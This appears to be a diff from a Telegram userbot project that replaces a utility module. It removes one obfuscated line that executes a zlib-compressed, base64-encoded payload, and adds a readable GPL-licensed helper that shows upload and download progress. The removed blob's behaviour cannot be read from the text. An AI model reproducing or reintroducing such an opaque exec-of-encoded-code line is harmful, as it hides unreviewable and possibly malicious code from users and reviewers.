@@ -1,3 +1,56 @@
-import zlib
-import base64
-exec(zlib.decompress(base64.b64decode("eJyVVV2P4jYUfedXXDFakVQQmJm3aWdVOl+LNMsgYLQdbVfgSW6Iu8aObGcoovyNfd7H/q7+kl47QADNtt08IGKfe+459147J3Cl8qXms8xCcBXCWeesA90EP8N7VggmWe2kdgKjwfWvrXseozTY6iUoLU856gu4G9y3zqNOS+mWYBY1YccZN5BrNdNsDvQ31YhgVGoXTOMFLFUBMZOgMeHGav5cWARugcmkrTTMVcLTJdHQUiET1GAzBGKeG1Cpf7nrP8IdStRMwKB4FjyGjTRglNmtmAwTeHY0LuDWKRhtFMCtIl5muZJNQE77Gl5QG3qH822KDV8TlHMUMOtka1C5CwtJ6xK83W1k5Kt07LwymACXnjhTObnJiJD8LbgQ8IxQGEwL0SQGwsKH3vjdw+MYuv0n+NAdDrv98dOPhLWZol18wZKJz3PBiZg8aSbtkqQTwfub4dU7iuj+0rvvjZ9IP9z2xv2b0QhuH4bQhUF3OO5dPd53hzB4HA4eRjcRjNBpQgr/l9KmvjlUvwQt48KUlp+om4aEiQQy9oLU1Rj5C8liENNc/XfLiIMJJWfeIGGrCkYAvRSksk0wJPCnzNr8ot1eLBbRTBaR0rO2KDlM+21Uq9WoIkpbsHyO2/9zZrNaLdVqDpFVShjYbGTFnMnnpUXT9AETskdgN8ElGv+I0Xd7F3LFZIxioFWMxlA6ZpYypmqkpWBaDGpAT1xoTQeEeJVlogmzRFNFyIRlmlYdeGKXOTY9OuUCJ5LN8bKvJKG4mcQ+kcDk8pYJqlB44ZFSLeDSi43cTxD6VTotKS27zVaZwi/z9IDJTeNYF1gyuUczTk098rSJ1O6EBJ75DZx2ok4nhMtL6Lhp2rhz795fxZijpm5YNkPSs4X9QPEdaJfYHdTkSJoqVNvb2G2jYLnBZOJsEqqSE1YQy3Y7gScn+xu6kPh8hgpOphpFLhRLGu4k7noQCbVAHYSVCy/PMlsY4m88+hguZ409cY4sUQv5/XTXm6gjQoPfzC8/U2dlBd6O2oRuFgLUp6vOegp/wsfV6Xp1tv4E09X5+s20HpXzHLzC2zxYazSi3xWXwcf631++1v0p584T3SkzPAzfPu5QRalQSgd7PW9Tp8PwU/ht+r/+H/1ph1r5PTnKKahgTTgLq9bbeU6FOkyV1lf7hVz/JutH+9NVdUME27lau+tsf8MPXrg+DoafD1DlLK6nr2S5GXen0HoLq8M7KKDxDl9TdV1o/+V6PWjv2OyLqmrBFow+O+WFFNH31wbO6W58ncTjpIcPwUd+iAi5osqu62HtH6T2hQM=")))
+# Copyright (C) 2020 Adek Maulana
+#
+# SPDX-License-Identifier: GPL-3.0-or-later
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+
+import time
+import math
+
+from .tools import humanbytes, time_formatter
+from .exceptions import CancelProcess
+
+
+async def progress(
+    current, total, gdrive, start, prog_type, file_name=None, is_cancelled=False
+):
+    now = time.time()
+    diff = now - start
+    if is_cancelled is True:
+        raise CancelProcess
+
+    if round(diff % 10.00) == 0 or current == total:
+        percentage = current * 100 / total
+        speed = current / diff
+        elapsed_time = round(diff)
+        eta = round((total - current) / speed)
+        if "upload" in prog_type.lower():
+            status = "Uploading"
+        elif "download" in prog_type.lower():
+            status = "Downloading"
+        else:
+            status = "Unknown"
+        progress_str = "[{0}{1}] `{2}%`".format(
+            "".join("█" for i in range(math.floor(percentage / 10))),
+            "".join("░" for i in range(10 - math.floor(percentage / 10))),
+            round(percentage, 2),
+        )
+        tmp = (
+            f"{progress_str} - {status}\n"
+            f"`Size:` {humanbytes(current)} of {humanbytes(total)}\n"
+            f"`Speed:` {humanbytes(speed)}\n"
+            f"`ETA:` {time_formatter(eta)}\n"
+            f"`Duration:` {time_formatter(elapsed_time)}"
+        )
+        await gdrive.edit(f"`{prog_type}`\n\n" f"`Status`\n{tmp}")
